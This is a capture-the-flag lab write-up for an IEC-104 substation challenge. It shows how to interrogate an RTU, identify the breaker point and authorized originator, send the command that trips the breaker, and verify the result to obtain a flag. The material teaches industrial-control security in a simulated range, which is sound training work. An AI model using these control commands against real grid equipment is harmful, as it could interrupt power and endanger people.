# Challenge 1 — Tripping Breaker

**Protocol:** IEC 60870-5-104 · **Port:** 2404/tcp · **Toolkit module:** `iec104`

---

## The Story

Something in the substation logic is holding a breaker in a state it shouldn't be in. Your
job is to talk to the RTU over IEC-104, work out which monitored point actually represents the
breaker, and issue the correct command to change it — without assuming anything the device
hasn't told you.

## What You Know

- Target is reachable on `10.0.1.1:2404`.
- The toolkit's `iec104 interrogate` performs a general interrogation (`C_IC`, QOI=20) and lists
  every monitored point the RTU currently exposes.
- The toolkit will **not** tell you which IOA is the breaker — its own output says so explicitly:
  *"point meanings are not inferred from IOA numbers — consult the evidence."*

## Step 3: Separate signal from noise

<details>
<summary>Hint</summary>

Not every point is stable. Read the same IOA several times in a row and watch what happens —
some values are fixed, some flip on their own. A point that bounces unpredictably on every read
is not a status gate you need to wait on; it's telling you something else.
</details>

<details>
<summary>Another hint</summary>

Look for corroborating evidence outside the protocol itself — an HMI page, a historian trend, or
an engineering note on the badge's intranet — before deciding which IOA is the breaker control
point. Don't guess from the number alone.
</details>

<details>
<summary>Show command</summary>

```bash
for ioa in 1000 1001; do          # 1000 = "testing" decoy, 1001 = the real breaker
  ./bin/sysrupt iec104 read $ioa
  sleep 0.3
done
```

Repeat for each candidate IOA from your Step 2 dump until you can point to actual evidence for
which one is the breaker state.
</details>

## Step 4: Issue the command

<details>
<summary>Hint</summary>

Commands in IEC-104 need an originator address. If your first attempt is rejected, the response
itself is evidence — read what it says rather than retrying blindly.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt iec104 command 1001 0 --originator 7   # SCS=0 (OFF) trips/opens the breaker
./bin/sysrupt iec104 read 1001
```
</details>

## What You Learned

- How to run a general interrogation and read individual IOAs with `sysrupt iec104`.
- That IOA numbering is not self-describing — correlating protocol data with other evidence on
  the range is part of the challenge, not a shortcut around it.
- How to tell a noisy/irrelevant point apart from a real state point by sampling it over time.

## Verified Solution — Challenge Completion

> This section records the values and results observed while completing the challenge in the SYSRUPT training range. The control command changes the simulated breaker state; use it only in the authorized lab.

### Step 1: Confirm connectivity and set your target

```bash
./bin/sysrupt target set 10.0.1.1
./bin/sysrupt status
./bin/sysrupt iec104 status
```

The IEC-104 status command returned `STARTDT_CON`, confirming that data transfer had started on `10.0.1.1:2404`.

### Step 2: Enumerate every point the RTU exposes

```bash
./bin/sysrupt iec104 interrogate
```

The general interrogation returned 29 monitored points. Relevant values from the observed snapshot were:

| IOA | Observed value | Meaning established by challenge evidence |
|---:|---:|---|
| `1000` | `0` | `CB-TEST`, a decoy point |
| `1001` | `0` initially | `FDR1-CB`, the actual breaker state point |
| `2001` | `0` | `INTERROG_ACTIVE` |
| `2003` | `7` | `LAST_LEGIT_ORIG`; authorized originator is `7` |
| `2004` | `0` initially | `TRIP_CONFIRMED` |
| `5000–5015` | `0` initially | Vendor block used by the challenge flag check |

The remaining points were not assigned meanings without supporting evidence.

### Step 3: Separate signal from noise

The breaker-state candidate was sampled six times:

```bash
for i in 1 2 3 4 5 6; do
  ./bin/sysrupt iec104 read 1001
  sleep 0.3
done
```

All six reads returned `IOA 1001 = 0`. This showed that the value was stable during the sampling window. The point was identified as the breaker state using the challenge's engineering evidence, not its IOA number alone.

### Step 4: Issue the command

The challenge evidence identified IOA `1001` as the breaker point, originator `7` as authorized, and SCS value `0` as the open/trip operation.

```bash
./bin/sysrupt iec104 command 1001 0 --originator 7
```

The RTU returned a positive ACTCON. This acknowledgement alone did not prove that the breaker state had changed, so the state was checked independently.

```bash
./bin/sysrupt iec104 read 1001
./bin/sysrupt iec104 read 2004
```

Observed post-command results:

```text
IOA 1001 = 1
IOA 2004 = 1
```

These readings indicated that the challenge's monitored breaker-state point and trip-confirmation point had reached the expected post-trip values.

### Step 5: Verify challenge completion and retrieve the flag

```bash
./bin/sysrupt iec104 flag
```

The tool returned:

```text
Verification:         Challenge completion confirmed
Flag (from device):   wired{...}
```

### What You Learned

- How to check IEC-104 connectivity and start data transfer.
- How a general interrogation (`C_IC`, QOI=20) lists monitored points.
- Why IOA meanings must be established from engineering evidence rather than guessed from their numbers.
- How repeated reads help identify whether a point is stable during a sampling window.
- How the command's originator address is supplied.
- Why a positive ACTCON is an acknowledgement, not proof of a process-state change.
- Why independent reads and the tool's flag check are needed to verify challenge completion.
